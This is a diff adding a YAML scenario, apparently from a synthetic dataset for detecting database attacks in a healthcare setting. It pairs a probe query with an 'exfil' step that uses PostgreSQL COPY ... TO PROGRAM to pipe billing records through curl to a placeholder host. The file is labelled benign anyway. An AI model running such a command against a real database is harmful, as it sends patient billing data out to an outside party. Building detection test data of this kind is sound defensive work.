@@ -1,0 +1,33 @@
+scenario_id: gen_healthcare_42_sql_injection_ben_1156b
+family_id: gen_healthcare_42_sql_injection_fam_1156
+domain: healthcare
+time_of_day: '11:10'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT invoice_id, payment_status FROM billing WHERE patient_id = 57805
+  - step_id: exfil
+    sql: COPY (SELECT invoice_id, payment_status FROM billing WHERE department_id
+      = '11') TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 203.0.113.92
+      port: 9001
+matched_pair_id: gen_healthcare_42_sql_injection_pair_1156
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
